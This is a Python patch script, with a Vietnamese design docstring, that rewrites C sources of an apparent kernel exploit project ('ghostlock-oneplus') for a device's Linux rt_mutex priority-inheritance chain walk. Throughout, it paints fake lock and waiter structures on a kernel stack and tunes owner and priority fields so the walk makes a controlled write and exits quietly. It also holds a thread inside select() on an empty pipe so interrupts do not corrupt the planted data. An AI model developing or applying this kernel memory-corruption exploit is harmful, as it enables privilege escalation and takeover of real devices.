#!/usr/bin/env python3
"""patch_ssopt_hold.py  (design v3)

Gốc rễ (đo được):
  - consumer mất ~5.7s trong kernel (walk lặp, đọc lại waiter mỗi vòng);
  - trong lúc đó T SPIN TRONG USERSPACE ⇒ mỗi IRQ vào T được xử lý trên kernel
    stack của T; chuỗi IRQ từ el0 đi sâu ~0x1b0 (bằng đúng frame của
    do_nanosleep) ⇒ ghi cặp saved-PC đè waiter+0x08/+0x10;
  - walk đọc lại ⇒ 3 kết cục: bail câm (PA/QA), panic rb_erase+0x20 với rác
    (kpr/kpP/kpPB), treo (QA delay=0 -> reset, không dump).
⇒ Chỉ cần T Ở TRONG KERNEL suốt thời gian walk: IRQ khi đó rơi *dưới* frame
  hiện tại (rất sâu) nên không chạm waiter.

Thiết kế v3:
  1) paint đủ 8 word (tree_entry = VALUE/TARGET/0, task, lock, prio=140);
  2) T block bằng select() nfds=64:
       - core_sys_select's stack_fds = sp+0x50..+0x150 = SP0-0x210..SP0-0x110,
         nhưng chỉ 6*FDS_BYTES(64) = 0x30 byte đầu được dùng ⇒ ghi ở
         SP0-0x210..SP0-0x1e0, KHÔNG chạm waiter (SP0-0x1b0..0x160)  ⇒ paint
         không bị zero_fd_set() xoá như vụ nfds=192;
       - fd = đầu đọc của pipe RỖNG ⇒ do_select() không ready ⇒ block tới hết
         timeout (1s) ⇒ T ở trong kernel suốt cửa sổ walk.
  3) Lần ghi PI xảy ra ngay ở chain[7] rt_mutex_dequeue (tree_entry paint), nên
     chỉ cần: fake_lock->owner = 0  ⇒ chain[9] kết thúc walk NGAY, không cần
     fake_task/pi_tree (bớt hẳn phụ thuộc vào waiter->task);
     và rb_leftmost = fake_w0 với prio < task->prio để enqueue đặt W sang phải
     ⇒ rb_leftmost KHÔNG đổi ⇒ chain[9] không gọi wake_up_process().
"""
U = "/root/ghostlock/ghostlock-oneplus/src/core/util.c"
u = open(U).read()

# ---- page: owner=0 + W0 prio thấp (để W vào bên phải => rb_leftmost giữ nguyên)
old = """    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    }"""
new = """    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      /* Design v3 (setsockopt route): owner = 0 so chain[9] "if
       * (!rt_mutex_owner(lock))" ends the chain walk right after chain[7]
       * already performed the write -- no fake_task / pi_waiters dependency.
       * With owner != 0 the walk continues into [10]/[11] and reads
       * waiter->task, the one field an IRQ can clobber on T's stack. */
      put64(p, LOCK_OFF + 0x18,
            env_flag("SSOPT_OWNER0", 1) ? 0 : (fake_task | 1));
    }"""
assert u.count(old) == 1, ("owner", u.count(old))
u = u.replace(old, new, 1)

old = """    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);"""
new = """    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    /* W0 is fake_lock->waiters.rb_leftmost (rt_mutex_top_waiter check: its
     * ->lock@0x38 must equal fake_lock, set below).  Its prio must be BELOW the
     * waiter's prio (= task->prio, the consumer sets nice=19 -> 139) so that
     * rt_mutex_enqueue() sends W to W0's right: rb_leftmost then stays W0 and
     * chain[9]'s "prerequeue_top_waiter != top_waiter" wake_up_process() is
     * skipped. */
    if (env_flag("SSOPT_OWNER0", 1))
      put32(p, W0_OFF + 0x40, 100);"""
assert u.count(old) == 1, ("W0 prio", u.count(old))
u = u.replace(old, new, 1)
open(U, "w").write(u)
print("util.c: FOPS page owner=0 (SSOPT_OWNER0=1) + W0 prio=100")

# ---- route: block in kernel with select(64) instead of pure userspace spin
F = "/root/ghostlock/ghostlock-oneplus/src/core/fops.c"
s = open(F).read()

old = """int sock_paint_fd = -1;"""
new = """int sock_paint_fd = -1;
/* Design v3 hold: an EMPTY pipe read end selected in a small-nfds select() makes
 * the route thread block INSIDE the kernel while the consumer walks, so IRQs
 * cannot land on the paint (they land far below the current -- deep -- frame).
 * nfds = 64 keeps core_sys_select's used stack_fds at SP0-0x210..SP0-0x1e0,
 * i.e. below the waiter at SP0-0x1b0 (nfds=192 would have zeroed it). */
static int ssopt_hold_r = -1;
static int ssopt_hold_w = -1;"""
assert s.count(old) == 1, ("hold decl", s.count(old))
s = s.replace(old, new, 1)

old = """    /* Park in USERSPACE (no syscall) until the consumer has walked.  A second
     * syscall is NOT usable as a "hold" here: every deep syscall reuses this
     * region, and select(192) is the worst case -- its res_out/res_ex are
     * SP0-0x1b0..SP0-0x180 == waiter+0x00..0x2f, and zero_fd_set() wipes the
     * tree_entry/pi_tree we just painted.  The paint survives only because T
     * issues nothing between setsockopt and the consumer's sched_setattr(T). */
    for (int spin = 0;
         spin < 2000000000 && !atomic_load(&pselect_walk_done);
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }"""
new = """    /* HOLD: block inside the kernel for the whole walk window.
     * Rotating in userspace is NOT safe: an IRQ taken while T is at EL0 is
     * serviced on T's kernel stack, descends ~0x1b0 and overwrites the waiter
     * (measured: rb_erase_cached+0x20 with a high-entropy rb_right in
     * kpr/kpP/kpPB; silent bail in PA/QA; hang in the delay=0 run).  Blocked in
     * select(), IRQ frames land far below the current frame and the paint is
     * frozen.  Timeout is well above the consumer's 20 ms delay. */
    if (ssopt_hold_r < 0) {
      int pfd[2];
      if (pipe(pfd) == 0) {
        if (pfd[0] >= 64) {          /* keep the selected fd below nfds */
          int nb = fcntl(pfd[0], F_DUPFD, 3);
          if (nb >= 0 && nb < 64) { close(pfd[0]); pfd[0] = nb; }
        }
        ssopt_hold_r = pfd[0];
        ssopt_hold_w = pfd[1];
      }
    }
    if (ssopt_hold_r >= 0 && ssopt_hold_r < 64) {
      fd_set h_in, h_out, h_ex;
      FD_ZERO(&h_in); FD_ZERO(&h_out); FD_ZERO(&h_ex);
      FD_SET(ssopt_hold_r, &h_in);          /* empty pipe: never ready */
      struct timeval h_tv = { .tv_sec = 1, .tv_usec = 0 };
      select(64, &h_in, &h_out, &h_ex, &h_tv);
    }
    for (int spin = 0;
         spin < 100000000 && !atomic_load(&pselect_walk_done);
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }"""
assert s.count(old) == 1, ("hold block", s.count(old))
s = s.replace(old, new, 1)
open(F, "w").write(s)
print("fops.c: in-kernel hold = select(64) on an empty pipe (1s), spin fallback reduced")
